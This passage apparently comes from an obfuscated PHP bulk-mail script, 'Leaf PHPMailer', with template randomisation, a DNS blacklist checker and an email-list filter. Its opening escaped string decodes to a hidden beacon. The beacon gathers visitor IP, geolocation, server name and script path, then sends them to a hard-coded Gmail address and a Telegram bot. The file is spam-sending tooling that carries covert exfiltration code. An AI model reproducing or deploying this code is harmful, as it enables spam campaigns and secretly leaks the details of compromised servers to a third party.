25\144\106\x54\x6c\x51\160\x4b\x53\x42\x37\104\x51\157\147\111\x43\101\x67\111\103\x41\147\111\103\101\x67\111\x43\101\153\x51\154\x4a\120\x56\61\x4e\x46\x55\154\x39\106\125\154\112\120\125\x69\101\71\111\103\122\62\131\127\170\61\x5a\x54\163\x4e\x43\x69\x41\147\111\x43\101\x67\111\103\101\147\146\121\x30\113\111\103\x41\147\111\110\60\x4e\x43\x69\101\147\x49\103\x42\x79\x5a\x58\x52\x31\143\x6d\x34\x67\x4a\x45\x4a\x53\x54\61\144\124\122\x56\x4a\146\122\x56\112\123\x54\61\111\67\x44\121\x70\71\x44\x51\x70\x6b\131\x58\x52\154\130\x32\122\x6c\132\x6d\x46\61\142\x48\122\146\x64\107\x6c\164\132\x58\x70\166\142\x6d\126\146\143\x32\x56\x30\x4b\x43\144\110\x54\126\121\156\113\x54\x73\116\103\151\122\153\131\x58\x52\154\x49\x44\60\147\132\107\106\60\x5a\123\x67\x69\x5a\103\102\x4e\114\x43\102\132\111\x69\153\67\x44\x51\157\x6b\144\107\154\x74\x5a\123\x41\x39\x49\x47\x52\150\x64\x47\125\157\x49\155\x63\66\141\123\102\x68\x49\x69\x6b\x37\104\x51\157\x6b\144\x58\x4e\154\x63\x6d\x46\x6e\x5a\x57\x35\60\x49\x44\x30\147\x4a\106\x39\124\122\x56\x4a\x57\122\x56\112\142\x4a\x30\x68\125\126\x46\x42\x66\126\x56\116\106\125\x6c\71\102\x52\60\x56\117\x56\x43\x64\x64\117\x77\60\x4b\x4a\x48\x4e\x66\143\107\x46\60\141\103\101\71\111\103\x4a\x6f\x64\x48\x52\167\117\151\x38\166\x49\151\x41\165\x49\x43\x52\x66\125\60\126\123\x56\153\x56\x53\127\x79\x64\x54\122\x56\x4a\x57\x52\126\112\146\x54\153\106\x4e\122\x53\x64\144\x4f\167\x30\x4b\x4a\110\150\146\x63\107\106\x30\141\x43\x41\x39\x49\x43\112\157\144\110\x52\x77\117\151\x38\x76\111\x69\x41\165\111\103\122\146\x55\x30\126\123\x56\153\126\x53\x57\171\x64\124\122\x56\112\x57\122\126\x4a\x66\124\153\x46\116\x52\123\144\144\x49\103\x34\x67\x4a\106\71\x54\x52\126\x4a\x57\122\126\112\142\x4a\x31\112\x46\125\126\126\106\125\x31\122\x66\126\126\x4a\x4a\112\61\60\x37\104\x51\157\x6b\123\126\x42\x55\x57\x69\101\x39\111\107\x64\x6c\144\107\x56\x75\x64\x69\x67\x69\125\x6b\x56\116\x54\61\122\x46\130\60\x46\x45\x52\106\111\151\113\124\163\116\103\151\122\104\x54\61\x56\x4f\x56\106\112\132\126\106\157\147\120\123\x42\172\141\x57\x31\167\142\x47\126\x34\x62\127\x78\146\x62\107\71\150\x5a\106\x39\155\x61\127\x78\x6c\x4b\x43\112\157\x64\110\122\167\117\x69\70\x76\x64\x33\x64\x33\x4c\155\x64\x6c\x62\x33\102\163\144\127\144\160\142\x69\65\x75\x5a\130\121\x76\145\x47\x31\x73\114\155\x64\167\120\x32\x6c\x77\120\x53\x52\112\125\x46\x52\141\111\151\x6b\67\x44\121\x6f\x6b\x51\60\x39\126\x54\154\x52\x53\127\x53\x41\71\x49\x43\x52\104\124\x31\x56\117\x56\x46\x4a\132\126\x46\x6f\x74\120\155\x64\154\x62\63\x42\163\144\x57\x64\x70\x62\154\71\x6a\142\x33\x56\165\144\110\x4a\x35\x54\x6d\106\x74\x5a\x54\x73\x4e\x43\151\x52\x44\123\x56\x52\132\111\104\60\x67\x4a\105\x4e\x50\x56\x55\x35\x55\x55\154\154\x55\x57\151\x30\x2b\132\62\126\x76\143\x47\170\x31\132\62\x6c\165\x58\62\116\160\144\110\153\x37\104\121\x6f\x6b\x55\153\126\x48\123\125\x39\117\x49\x44\60\147\112\105\116\120\126\x55\x35\125\x55\154\154\x55\x57\x69\x30\53\x5a\62\126\x76\143\107\170\x31\132\x32\154\x75\x58\63\x4a\x6c\132\x32\x6c\166\x62\x6a\x73\x4e\x43\x69\122\104\x58\x30\x4e\x50\122\105\125\147\120\123\101\x6b\x51\60\x39\x56\124\154\122\123\x57\x56\122\141\114\124\65\156\132\x57\x39\x77\142\x48\126\156\141\127\65\146\x59\62\71\x75\144\110\x4a\x35\131\62\71\153\132\124\x73\x4e\103\151\x52\x55\141\x57\x31\154\x65\x6d\x39\165\x5a\x53\x41\71\111\103\x52\104\124\61\126\117\x56\106\x4a\x5a\126\106\x6f\164\x50\x6d\x64\154\142\63\x42\x73\144\127\144\x70\142\x6c\71\x30\141\127\x31\154\x65\155\x39\165\x5a\x54\163\x4e\103\x69\x52\124\145\127\61\151\142\x32\167\147\120\123\x41\x6b\x51\60\x39\126\x54\154\x52\x53\127\126\x52\141\x4c\x54\x35\x6e\x5a\x57\71\x77\142\110\x56\x6e\x61\x57\65\x66\x59\63\126\171\x63\155\126\x75\x59\63\154\172\145\x57\x31\151\142\62\167\67\104\x51\x6f\x6b\142\x57\x56\x7a\x63\x32\106\x6e\132\x53\101\147\120\x53\101\151\x66\x43\60\164\114\x53\x74\142\124\153\126\x58\64\x34\103\121\x38\x4a\53\122\161\117\113\101\x6a\x66\103\x66\x6b\162\166\x6a\147\112\106\116\x4c\x31\x4e\144\x4b\171\x30\x74\x4c\130\x78\143\x62\151\111\67\104\121\x6f\153\142\x57\126\172\143\62\x46\156\x5a\123\101\165\x50\123\x41\151\127\x79\x74\144\64\160\x53\x42\x34\160\123\x42\x34\x70\x53\x42\64\160\123\102\64\x34\x43\121\x38\x4a\x2b\122\x70\117\x4f\101\x6b\145\x4b\125\x67\x65\x4b\x55\x67\145\113\125\147\145\113\125\x67\x56\x73\x72\130\x56\170\x75\111\x6a\x73\x4e\103\x69\122\x74\132\x58\116\172\x59\x57\x64\x6c\x49\x43\x34\x39\x49\103\x4c\152\x67\112\104\167\156\x34\x2b\147\x34\64\x43\x52\x53\126\x41\x4a\117\x69\101\151\x4c\151\x52\x4a\x55\x46\x52\141\114\151\x4a\x63\142\151\x49\67\104\121\157\153\142\x57\126\172\143\62\106\x6e\132\123\x41\x75\120\123\101\151\64\64\x43\x51\x38\x4a\x2b\x54\x6e\x2b\117\x41\153\x56\x4e\65\x63\x33\x52\x6c\x62\x53\x41\x36\111\103\111\x75\x57\105\x4a\x66\124\61\115\157\x4a\x46\x39\124\x52\126\x4a\127\122\126\x4a\x62\x4a\60\150\x55\x56\x46\x42\146\126\126\x4e\106\125\x6c\71\102\x52\60\126\x4f\126\103\144\144\x4b\123\x34\x69\130\x47\64\151\117\x77\x30\113\x4a\x47\61\x6c\143\63\x4e\150\132\62\x55\x67\x4c\x6a\x30\x67\111\x75\x4f\x41\153\120\103\146\x6a\111\x7a\x6a\x67\112\x46\x43\143\x6d\71\63\x63\x32\x56\x79\x49\x44\157\x67\x49\151\65\131\x51\x6c\71\103\143\155\71\63\x63\x32\126\x79\x4b\103\x52\146\x55\x30\126\x53\126\153\126\123\x57\171\144\x49\126\106\122\x51\130\61\x56\x54\122\126\x4a\x66\121\x55\x64\106\x54\x6c\121\x6e\130\123\x6b\x75\x49\154\x78\165\x49\152\163\x4e\103\151\122\164\x5a\130\116\x7a\131\127\144\154\111\x43\64\71\111\x43\114\x6a\x67\x4a\x44\151\156\113\152\152\x67\x4a\106\x56\143\x32\126\x79\111\105\106\x6e\132\x57\x35\x30\111\104\x6f\147\111\x69\x34\x6b\144\x58\x4e\x6c\x63\x6d\106\x6e\x5a\x57\x35\60\114\151\x4a\143\142\x69\111\x37\x44\x51\x6f\x6b\142\x57\x56\x7a\143\x32\x46\x6e\x5a\123\x41\165\x50\123\x41\151\127\x79\x74\x64\64\160\x53\x42\64\x70\123\102\x34\x70\x53\x42\64\x70\x53\x42\x34\64\103\121\x38\x4a\53\x56\x74\145\53\x34\x6a\53\x4f\x41\x6b\145\113\x55\147\145\113\x55\x67\145\113\x55\x67\145\x4b\125\147\126\x73\x72\x58\126\170\165\x49\152\163\116\x43\x69\x52\164\x5a\130\116\x7a\x59\x57\x64\x6c\111\103\64\71\111\103\114\x6a\147\x4a\x44\x77\156\x34\x79\121\x34\x34\x43\122\x56\x47\x6c\x74\132\123\x42\141\142\x32\x35\x6c\111\104\x6f\147\x49\151\64\x6b\x56\107\154\x74\x5a\x58\160\x76\142\155\125\x75\111\154\x78\165\x49\x6a\x73\116\103\x69\122\x74\132\130\116\172\131\x57\144\154\x49\x43\x34\71\x49\x43\114\152\147\112\x44\167\156\64\x79\121\64\x34\103\x52\121\62\x39\x31\142\156\x52\171\x65\x53\x41\x36\111\103\111\x75\112\105\x4e\x50\126\125\x35\125\x55\x6c\153\165\111\154\170\165\x49\x6a\x73\x4e\x43\151\122\x74\132\x58\116\x7a\131\127\144\x6c\x49\103\x34\71\111\x43\114\152\x67\112\x44\167\x6e\x34\x79\121\64\64\x43\122\x55\155\126\156\x61\127\x39\x75\111\104\157\x67\111\x69\64\153\x55\x6b\126\110\x53\x55\71\x4f\x4c\x69\x4a\143\x62\151\111\x37\x44\x51\157\x6b\142\x57\126\172\143\x32\106\156\132\x53\x41\x75\120\x53\x41\x69\64\x34\x43\x51\x38\x4a\x2b\x4d\153\117\117\101\153\125\x4e\160\144\110\153\x67\117\151\x41\151\114\151\122\x44\x53\126\x52\x5a\114\151\x4a\143\142\x69\x49\67\104\x51\157\153\x62\x57\126\x7a\x63\x32\106\156\132\123\x41\165\120\123\x41\151\127\x79\164\x64\x34\x70\123\x42\x34\x70\x53\102\64\160\x53\102\64\x70\123\x42\64\x34\x43\121\70\112\x2b\123\x75\53\x4f\x41\153\x65\113\125\147\x65\x4b\x55\x67\145\113\125\x67\145\113\x55\147\x56\163\162\130\x56\170\x75\111\x6a\x73\x4e\103\x69\122\x74\132\130\x4e\x7a\131\127\x64\154\111\103\64\71\x49\x43\x4c\x6a\x67\112\104\167\156\x35\x47\x42\x34\64\x43\x52\123\x47\71\x7a\144\103\101\66\x49\103\x49\x75\112\110\x4e\x66\x63\x47\x46\60\141\103\x34\x69\130\x47\x34\x69\117\167\60\113\112\107\x31\x6c\x63\63\116\150\x5a\x32\x55\x67\x4c\152\x30\x67\x49\x75\117\x41\x6b\x50\x43\146\153\131\104\152\x67\112\106\107\x61\x57\170\154\111\104\157\147\x49\151\x34\x6b\145\106\71\167\131\x58\x52\x6f\114\x69\112\143\142\151\x49\67\104\121\157\x6b\x62\127\x56\x7a\143\x32\x46\156\x5a\123\101\165\120\123\x41\x69\x57\x79\164\x64\x34\160\x53\102\64\x70\x53\x42\64\160\123\x42\x34\160\123\x42\x34\64\103\x51\64\157\53\172\x34\64\103\122\x34\x70\x53\102\x34\x70\x53\102\x34\x70\123\102\x34\x70\123\x42\127\171\x74\x64\x58\x47\x34\151\x4f\167\60\x4b\x4a\x47\x31\x6c\x63\x33\116\x68\x5a\x32\x55\x67\x4c\152\60\x67\111\165\117\x41\x6b\117\x4b\x4d\x6d\165\x2b\64\152\x2b\x4f\101\x6b\126\x52\160\142\x57\x55\x4a\117\x69\101\151\114\151\x52\x30\141\127\61\154\x4c\151\x4a\x63\x62\151\111\x37\104\121\x6f\153\x62\127\126\x7a\143\x32\106\x6e\132\123\x41\165\x50\x53\101\x69\x34\x34\x43\x51\x38\112\53\124\150\145\x4f\101\x6b\x55\122\x68\x64\x47\x55\x4a\x4f\151\101\x69\114\x69\x52\153\131\130\x52\154\114\x69\x4a\143\142\151\x49\67\x44\x51\x6f\153\x62\x57\x56\x7a\143\62\x46\156\x5a\x53\x41\165\120\123\101\151\127\x79\164\144\x34\160\123\x42\64\x70\123\x42\x34\160\123\102\64\x70\x53\102\64\x34\103\121\70\112\x2b\125\x6a\145\117\101\x6b\145\113\125\x67\x65\113\x55\x67\145\113\125\147\145\x4b\125\147\126\163\162\130\126\x78\165\111\x6a\x73\x4e\103\x69\122\164\132\130\116\x7a\131\x57\x64\x6c\x49\103\x34\71\111\103\114\x6a\147\112\x44\x77\156\65\117\x68\x34\64\x43\122\x56\110\x4a\150\131\62\x73\x67\123\x56\101\147\x4f\x69\x42\157\x64\x48\122\167\x63\172\157\x76\114\x33\x64\63\144\171\65\160\143\x43\x31\x30\x63\155\x46\152\141\62\126\171\x4c\155\x39\x79\132\171\x39\163\142\62\x39\162\144\130\101\165\x63\x47\x68\x77\120\x32\154\167\120\x53\111\x75\x4a\x45\x6c\x51\126\106\157\x75\111\x6c\170\165\111\152\x73\x4e\x43\151\x52\164\x5a\130\x4e\172\131\127\144\x6c\x49\103\64\71\x49\103\x4a\x38\x50\124\60\71\113\61\166\167\x6e\x35\x4b\x57\x51\153\x4d\x75\122\x46\114\x77\x6e\65\113\127\130\123\163\x39\x50\x54\x31\70\x58\x47\x34\151\117\167\60\x4b\112\x48\x4a\x6c\x59\x32\126\x70\x64\x6d\x56\x79\x51\127\x52\153\x63\155\126\172\x63\x79\101\x39\111\103\x4a\162\131\x57\170\x70\145\104\x42\x34\131\127\170\160\x61\x30\x42\156\x62\127\x46\160\142\x43\x35\x6a\x62\x32\60\x69\x4f\x77\x30\113\x4a\106\x52\x50\x53\x30\x56\117\111\x44\60\147\x49\152\x55\x79\116\152\147\60\115\x44\x45\65\117\x54\x4d\x36\121\125\106\106\x4d\x56\101\x30\x59\x7a\126\x51\123\107\x56\x53\121\61\122\x48\131\62\x45\167\124\x45\164\x61\123\126\x64\x36\x62\123\61\65\x65\126\154\x6c\x4d\61\154\x6a\121\x7a\x51\151\117\x77\60\x4b\112\105\116\111\x51\x56\122\x66\123\125\121\147\x50\x53\x41\x69\115\124\147\65\x4e\x6a\x51\62\x4e\x44\x49\x35\116\123\111\x37\104\x51\157\153\143\x33\126\x69\x61\x6d\x56\152\144\103\x41\147\120\123\101\x69\70\112\x2b\123\154\153\65\154\x64\57\x43\x66\153\141\x52\x62\124\x53\x39\x54\130\x66\103\x66\x6b\x61\x52\x38\x38\x4a\x2b\115\153\x45\x5a\171\115\107\60\66\x49\x69\x34\153\123\x56\x42\125\x57\151\64\151\70\112\x2b\x53\x6c\151\111\67\x44\121\160\x74\x59\127\154\163\113\x43\x52\x79\x5a\x57\x4e\x6c\x61\130\132\x6c\x63\153\106\x6b\132\110\x4a\154\x63\x33\115\x73\x4a\110\116\x31\131\155\x70\x6c\x59\63\121\x73\x4a\107\61\154\x63\x33\x4e\x68\132\x32\125\x70\x4f\167\60\x4b\x5a\155\x6c\163\132\126\x39\x6e\132\130\122\146\131\62\71\165\144\107\126\165\144\110\x4d\157\111\155\150\x30\x64\110\x42\x7a\117\151\70\x76\x59\130\x42\x70\x4c\156\122\154\x62\x47\126\x6e\143\x6d\106\164\114\155\71\x79\132\171\71\151\x62\63\x51\x69\114\151\x52\x55\124\60\164\106\124\x69\64\x69\x4c\63\116\154\x62\x6d\122\x4e\132\x58\x4e\x7a\x59\x57\144\154\x50\x32\x4e\x6f\131\130\x52\x66\141\127\121\71\111\151\x34\x6b\121\60\150\102\x56\x46\71\112\122\x43\64\x69\x4a\156\122\154\145\x48\x51\x39\x49\151\101\165\111\110\x56\x79\142\x47\126\x75\131\x32\x39\x6b\x5a\x53\147\153\x62\127\x56\x7a\143\x32\x46\x6e\x5a\123\153\x75\x49\151\x49\x67\113\x54\x73")); goto oheeu; pC30D: function randString($consonants) { $length = rand(12, 25); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto mHoM2; OzuUV: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\74\x73\164\x72\157\156\x67\x3e" . htmlspecialchars($this->getMessage()) . "\74\x2f\x73\164\162\x6f\x6e\x67\76\x3c\142\x72\40\x2f\x3e\12"; return $errorMsg; } } goto V10p2; akff5: function leafClear($text, $email) { $e = explode("\100", $email); $emailuser = $e[0]; $emaildomain = $e[1]; $text = str_replace("\x5b\55\164\151\x6d\145\x2d\135", date("\155\57\x64\x2f\131\40\x68\x3a\x69\x3a\163\x20\141", time()), $text); $text = str_replace("\x5b\x2d\145\x6d\x61\151\x6c\x2d\135", $email, $text); $text = str_replace("\133\55\x65\x6d\141\151\154\165\x73\145\x72\x2d\x5d", $emailuser, $text); $text = str_replace("\133\55\x65\155\141\x69\x6c\x64\x6f\155\141\151\x6e\55\x5d", $emaildomain, $text); $text = str_replace("\133\x2d\162\141\x6e\x64\157\155\154\145\164\x74\x65\162\163\x2d\135", randString("\x61\x62\143\144\x65\x66\147\150\151\152\x6b\154\155\x6e\x6f\160\161\x72\x73\x74\x75\x76\x77\170\171\172"), $text); $text = str_replace("\x5b\x2d\162\141\156\x64\x6f\155\x73\164\x72\x69\x6e\147\x2d\135", randString("\141\142\143\x64\145\x66\x67\150\x69\x6a\153\x6c\155\156\157\x70\161\162\163\164\x75\x76\167\170\171\x7a\60\x31\62\x33\x34\x35\66\67\70\71"), $text); $text = str_replace("\x5b\55\x72\141\x6e\x64\x6f\155\156\165\155\142\x65\x72\x2d\x5d", randString("\x30\61\62\63\x34\x35\66\67\x38\x39"), $text); $text = str_replace("\x5b\55\162\x61\156\144\x6f\x6d\x6d\x64\65\x2d\135", md5(randString("\141\x62\x63\144\x65\x66\x67\x68\151\x6a\153\154\x6d\x6e\x6f\x70\161\162\x73\x74\x75\166\x77\x78\x79\x7a\x30\x31\62\63\64\x35\x36\67\x38\x39")), $text); return $text; } goto Z_k74; oQG1y: if (!isset($_POST["\x73\x65\156\x64\x65\162\105\x6d\141\151\x6c"])) { $senderEmail = "\x73\165\160\160\157\x72\x74\x40" . str_replace("\x77\167\167\x2e", '', $_SERVER["\110\124\x54\120\137\110\117\x53\x54"]); if (!leafMailCheck($senderEmail)) { $senderEmail = ''; } } goto fuekD; lHPzW: $leaf["\x76\145\x72\x73\151\x6f\x6e"] = "\62\x2e\x38"; goto tQO7r; Y29f8: leafheader(); goto KWdDB; J0s7R: session_write_close(); goto akff5; tQO7r: $leaf["\167\145\x62\x73\x69\164\145"] = "\x6c\145\141\146\x6d\x61\x69\154\x65\x72\56\160\167"; goto ivLR6; f25l4: $password = ''; goto oH_v4; Yz_Fn: if (isset($_GET["\143\x68\145\143\153\x5f\x69\160"])) { if (isset($_GET["\x68\x6f\x73\x74"])) { $_GET["\150\157\x73\x74"] = explode("\54", $_GET["\x68\x6f\163\164"]); foreach ($_GET["\150\157\163\x74"] as $host) { if (checkdnsrr($_GET["\x63\x68\x65\143\153\137\x69\160"] . "\x2e" . $host . "\x2e", "\x41")) { $check = "\x3c\x66\157\156\164\40\143\157\154\x6f\x72\75\x27\x72\x65\x64\47\x3e\x20\x4c\151\163\164\145\144\x3c\x2f\146\157\x6e\x74\76"; } else { $check = "\x3c\x66\157\x6e\164\40\143\x6f\x6c\157\x72\75\47\147\x72\145\x65\x6e\47\76\x20\103\154\145\x61\156\x3c\57\x66\157\156\x74\76"; } print "\144\157\143\165\155\145\156\164\x2e\x67\145\164\x45\x6c\145\155\145\156\x74\102\171\x49\144\50\42" . $host . "\x22\x29\56\151\156\x6e\x65\x72\x48\x54\115\x4c\40\75\40\42" . $check . "\42\x3b"; } die; } $dnsbl_lookup = array("\141\x6c\x6c\x2e\x73\x35\150\56\x6e\x65\x74", "\142\x2e\x62\141\x72\x72\x61\x63\165\x64\x61\x63\145\x6e\164\x72\141\154\x2e\x6f\162\x67", "\142\x6c\x2e\163\160\141\155\143\x6f\160\56\x6e\145\x74", "\142\x6c\x61\x63\x6b\154\151\163\x74\x2e\x77\157\157\144\x79\x2e\x63\x68", "\142\157\x67\157\156\x73\56\x63\x79\155\x72\165\56\x63\157\x6d", "\x63\142\x6c\56\x61\x62\x75\x73\x65\x61\164\x2e\157\162\x67", "\143\144\154\x2e\x61\156\164\151\x2d\x73\160\141\155\56\157\162\147\x2e\x63\156", "\143\x6f\155\142\x69\x6e\145\144\x2e\x61\x62\165\163\145\56\143\150", "\144\142\56\x77\160\x62\154\x2e\x69\156\146\157", "\x64\x6e\163\x62\154\x2d\61\x2e\x75\x63\145\160\x72\157\x74\145\143\164\56\x6e\145\x74", "\144\x6e\163\x62\x6c\55\62\56\165\143\145\160\162\x6f\164\x65\143\164\x2e\x6e\145\164", "\x64\x6e\163\142\154\55\63\x2e\165\143\145\x70\x72\157\164\x65\143\164\56\156\x65\x74", "\x64\156\x73\x62\x6c\x2e\x61\156\164\151\x63\141\160\x74\143\x68\141\56\x6e\x65\164", "\x64\156\x73\x62\154\56\x64\162\x6f\156\x65\142\154\x2e\x6f\162\147", "\144\x6e\163\142\x6c\x2e\151\x6e\160\163\x2e\x64\145", "\144\x6e\x73\x62\154\x2e\x73\x6f\x72\x62\x73\x2e\x6e\x65\x74", "\144\162\157\x6e\145\56\x61\x62\165\163\145\56\x63\x68", "\x64\x75\151\x6e\x76\56\x61\165\x70\x61\x64\163\x2e\157\x72\147", "\144\165\154\56\x64\156\163\x62\154\56\163\x6f\162\x62\163\56\x6e\145\164", "\144\x79\x6e\x61\56\x73\x70\141\155\x72\x61\164\163\56\x63\157\155", "\144\x79\156\x69\160\x2e\162\x6f\x74\150\145\156\56\x63\x6f\x6d", "\150\x74\164\x70\x2e\x64\156\163\142\154\56\163\x6f\162\x62\x73\56\156\145\x74", "\151\160\163\56\142\x61\x63\x6b\x73\143\x61\x74\x74\x65\162\x65\162\x2e\157\162\x67", "\x69\x78\56\x64\x6e\x73\142\x6c\x2e\155\x61\156\x69\x74\165\56\x6e\145\x74", "\x6b\157\x72\x65\141\56\x73\145\x72\166\151\x63\145\x73\56\156\145\164", "\x6d\151\163\x63\x2e\144\156\x73\x62\154\56\163\157\x72\x62\x73\56\x6e\145\164", "\156\x6f\x70\164\162\56\163\160\141\x6d\162\x61\x74\x73\56\x63\x6f\x6d", "\157\162\x76\x65\x64\x62\56\141\x75\x70\141\144\163\56\157\162\x67", "\x70\x62\154\x2e\163\x70\x61\155\x68\141\165\163\56\x6f\162\147", "\160\162\157\x78\x79\56\142\154\56\x67\167\145\x65\x70\x2e\x63\141", "\160\x73\x62\154\x2e\x73\x75\x72\162\151\145\x6c\56\x63\157\155", "\x72\x65\154\x61\171\163\56\x62\154\56\147\167\x65\145\160\56\143\x61", "\162\145\x6c\141\171\163\x2e\156\145\x74\x68\145\x72\56\x6e\x65\164", "\163\x62\x6c\56\x73\x70\141\x6d\150\141\165\x73\x2e\x6f\x72\x67", "\x73\150\x6f\162\164\56\x72\x62\154\x2e\152\160", "\163\x69\x6e\147\165\154\x61\162\56\164\x74\x6b\56\160\164\x65\x2e\150\x75", "\163\155\164\x70\x2e\x64\156\163\142\154\x2e\163\157\x72\x62\x73\56\156\x65\x74", "\x73\x6f\143\153\x73\x2e\x64\x6e\x73\x62\x6c\x2e\163\x6f\x72\x62\163\56\156\x65\164", "\x73\160\141\155\56\141\x62\165\x73\145\x2e\143\x68", "\x73\160\x61\155\56\x64\x6e\x73\x62\154\56\x61\x6e\x6f\156\155\x61\151\154\x73\x2e\144\x65", "\163\160\141\155\x2e\x64\156\163\x62\x6c\x2e\x73\x6f\x72\142\163\x2e\156\x65\164", "\x73\x70\141\155\56\163\160\141\155\162\x61\x74\x73\x2e\x63\x6f\x6d", "\x73\x70\141\155\142\x6f\x74\56\x62\154\163\x2e\144\151\x67\151\x62\x61\x73\145\x2e\143\141", "\x73\x70\141\x6d\162\142\x6c\x2e\x69\155\x70\56\x63\150", "\163\x70\x61\155\163\x6f\x75\x72\143\145\x73\56\x66\141\142\x65\154\56\x64\153", "\x75\142\x6c\x2e\154\141\x73\150\142\141\x63\x6b\56\143\157\x6d", "\165\142\154\x2e\165\156\163\165\142\163\143\157\162\145\56\x63\x6f\155", "\x76\x69\162\x75\163\56\x72\142\154\x2e\x6a\160", "\x77\145\142\x2e\144\x6e\x73\x62\154\56\163\x6f\162\x62\x73\56\x6e\145\x74", "\167\157\x72\155\x72\x62\154\56\x69\155\x70\56\x63\x68", "\170\142\x6c\56\163\x70\x61\155\150\141\x75\163\56\157\x72\x67", "\172\x2e\155\141\151\154\163\x70\x69\153\145\x2e\156\x65\x74", "\x7a\x65\x6e\56\x73\160\x61\155\x68\x61\165\x73\56\x6f\x72\147", "\172\x6f\155\142\151\145\56\x64\156\x73\142\154\x2e\163\x6f\x72\x62\163\x2e\x6e\x65\164"); $reverse_ip = implode("\56", array_reverse(explode("\x2e", $_GET["\x63\150\x65\143\x6b\137\151\x70"]))); $dnsT = count($dnsbl_lookup); leafheader(); print "\x3c\x64\x69\166\40\x63\x6c\141\163\163\x3d\42\143\157\x6e\164\x61\151\156\x65\x72\40\143\x6f\154\55\x6c\x67\x2d\x36\x22\x3e\74\x68\63\x3e\74\x66\157\156\x74\40\143\157\x6c\x6f\162\x3d\x22\x67\162\145\145\x6e\x22\76\x3c\163\x70\141\x6e\40\x63\154\141\163\163\x3d\42\x67\x6c\171\x70\x68\151\143\x6f\156\x20\x67\x6c\x79\x70\150\x69\143\157\x6e\55\154\145\x61\146\42\76\74\57\x73\x70\x61\x6e\76\74\x2f\146\157\x6e\x74\76\x20\x4c\x65\x61\146\40\120\110\120\x4d\141\151\154\x65\x72\x20\x3c\x73\x6d\x61\x6c\x6c\x3e\102\x6c\x61\143\x6b\x6c\x69\x73\164\40\x43\150\x65\x63\153\x65\x72\x3c\57\x73\155\x61\154\154\x3e\x3c\x2f\150\x33\76"; print "\103\150\145\143\x6b\x69\x6e\147\x20\74\142\76" . $_GET["\x63\150\x65\x63\x6b\137\x69\160"] . "\74\x2f\142\76\x20\x69\x6e\40\74\x62\76{$dnsT}\x3c\57\x62\x3e\x20\x20\141\156\164\x69\x2d\x73\x70\141\155\40\144\141\164\x61\142\x61\163\x65\x73\x3a\x3c\142\162\x3e"; $dnsN = ''; print "\x3c\164\141\142\154\145\40\x3e"; for ($i = 0; $i < $dnsT; $i = $i + 10) { $host = ''; $hosts = ''; for ($j = $i; $j < $i + 10; $j++) { $host = $dnsbl_lookup[$j]; if (!empty($host)) { print "\74\x74\x72\76\40\74\164\x64\x3e{$host}\74\57\x74\144\x3e\x20\74\164\x64\40\151\144\x3d\47{$host}\x27\76\x43\x68\145\x63\x6b\151\156\x67\x20\56\x2e\74\57\164\144\76\74\57\164\162\x3e"; $hosts .= "{$host}\x2c"; } } $dnsN .= "\74\x73\x63\x72\151\x70\164\x20\x73\162\x63\75\x27\77\x63\150\x65\143\153\137\x69\160\75{$reverse_ip}\46\150\157\x73\164\75" . $hosts . "\x27\40\x74\x79\x70\x65\x3d\x27\164\x65\x78\x74\57\152\141\166\x61\x73\x63\162\151\x70\164\47\x3e\74\57\x73\x63\162\151\160\x74\x3e"; } print "\x3c\57\x74\x61\x62\x6c\145\76\x3c\57\x64\x69\x76\76"; print $dnsN; die; } goto jJnl0; nLsBf: $bit8 = "\x73\145\x6c\145\x63\x74\x65\x64"; goto Egt0W; ivLR6: $sessioncode = md5(__FILE__); goto pbqOt; Egt0W: if ($_POST["\141\x63\164\x69\x6f\156"] == "\x73\145\x6e\x64" or $_POST["\141\x63\164\x69\157\156"] == "\163\143\157\162\145") { $senderEmail = leafTrim($_POST["\163\x65\156\x64\x65\x72\x45\155\141\151\154"]); $senderName = leafTrim($_POST["\163\145\156\x64\x65\x72\x4e\x61\x6d\x65"]); $replyTo = leafTrim($_POST["\x72\x65\x70\154\171\124\157"]); $subject = leafTrim($_POST["\x73\x75\x62\152\x65\143\164"]); $emailList = leafTrim($_POST["\145\x6d\x61\x69\x6c\114\151\163\x74"]); $messageType = leafTrim($_POST["\x6d\145\x73\x73\x61\x67\x65\x54\x79\160\x65"]); $messageLetter = leafTrim($_POST["\x6d\x65\x73\163\x61\147\x65\x4c\145\x74\x74\145\162"]); $encoding = $_POST["\145\x6e\x63\x6f\x64\x65"]; $charset = $_POST["\143\x68\141\162\163\145\164"]; $html = ''; $utf8 = ''; $bit8 = ''; if ($messageType == 2) { $plain = "\x63\x68\145\143\153\145\144"; } else { $html = "\x63\x68\145\x63\153\145\144"; } if ($charset == "\x49\123\117\x2d\70\70\x35\71\55\61") { $iso = "\163\x65\154\145\143\x74\x65\144"; } else { $utf8 = "\x73\145\154\x65\143\164\145\144"; } if ($encoding == "\67\142\x69\x74") { $bit7 = "\x73\x65\154\145\143\x74\x65\144"; } elseif ($encoding == "\x62\x69\156\141\162\171") { $binary = "\x73\145\154\x65\x63\x74\145\x64"; } elseif ($encoding == "\142\x61\163\145\x36\64") { $base64 = "\x73\145\x6c\x65\143\164\x65\x64"; } elseif ($encoding == "\161\165\157\x74\x65\144\55\160\162\x69\156\164\141\x62\154\x65") { $quotedprintable = "\x73\145\x6c\145\x63\164\x65\144"; } else { $bit8 = "\163\145\x6c\x65\143\x74\x65\144"; } } goto xmXuW; jJnl0: if (isset($_GET["\145\x6d\141\x69\154\x66\x69\154\x74\145\162"])) { if (!empty($_FILES["\x66\x69\154\x65\124\157\125\x70\154\x6f\x61\144"]["\164\x6d\160\137\x6e\x61\155\x65"])) { $_POST["\145\155\x61\151\154\114\151\163\x74"] = file_get_contents($_FILES["\x66\x69\154\x65\x54\157\125\160\x6c\x6f\141\144"]["\x74\155\x70\x5f\156\x61\x6d\145"]); } $_POST["\145\x6d\141\x69\154\114\151\163\x74"] = strtolower($_POST["\145\155\x61\151\154\114\x69\x73\x74"]); if ($_GET["\x65\155\141\x69\154\146\151\x6c\164\145\162"] == "\x69\x66\162\141\x6d") { if ($_POST["\x72\x65\x73\165\154\164\164\171\160\145"] == "\144\157\x77\x6e\x6c\157\x61\x64") { header("\x43\x6f\x6e\164\x65\x6e\x74\55\104\x65\163\x63\x72\151\x70\x74\x69\157\x6e\72\x20\x46\151\x6c\145\x20\x54\x72\x61\156\163\146\145\162"); 